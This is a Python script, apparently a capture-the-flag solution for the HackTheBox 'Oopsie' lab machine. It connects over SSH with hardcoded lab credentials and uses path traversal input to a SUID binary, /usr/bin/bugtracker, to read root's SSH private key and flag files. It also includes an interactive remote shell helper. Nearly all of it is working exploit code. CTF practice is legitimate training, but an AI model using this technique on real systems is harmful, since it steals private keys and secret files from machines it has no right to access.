import paramiko
import sys
import time
from paramiko import SSHClient, Channel

def exploit(channel: Channel):
    vuln_bin = "/usr/bin/bugtracker"
    payloads = [".ssh/id_rsa", "flag.txt", "root.txt"]
    root_prefix = "../"
    
    
    for file_path in payloads:
        
        print(f"executing {vuln_bin} ")
        channel.send(vuln_bin + "\n")
        first_output = channel.recv(2048).decode()
        print(first_output)
        
        payload = root_prefix + file_path + "\n"
        
        channel.send(payload)
        
        result: str = channel.recv(4096).decode()
        print(result)
        
        if(not result.__contains__("No such file or directory")):
            print("Found flag:\n" + result)
            break
            
 
 
 
def connect_with_ssh(hostname, username, password, action):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        # Connect to the target server
        ssh.connect(hostname, username=username, password=password)

        # Invoke a shell
        channel = ssh.invoke_shell()

        print("[+] connected successfully to target")
        action(channel)
    except Exception as e:
        print(f"An error occurred: {e}")
        raise e 
    finally:
        # Close the SSH connection
        ssh.close()
    
       
def run_ssh_interactive_shell(channel: Channel):


    print("Connected to the server. Type your commands below.")
    
    while True:
        # Display the shell prompt
        command = input("ssh> ")
        

            
        if command.lower() in ['exit', 'quit']:
            break
        
        # Send the command
        channel.send(command + '\n')
        time.sleep(1)  # Give the server time to respond
        
        # Receive the output
        output = channel.recv(1024).decode()
        print(output)


# Define your connection parameters
hostname = 'oopsie.htb'  # Replace with the target IP
username = 'robert'    # Replace with your SSH username
password = 'M3g4C0rpUs3r!'    # Replace with your SSH password


# Start the interactive shell
connect_with_ssh(hostname, username, password, exploit)
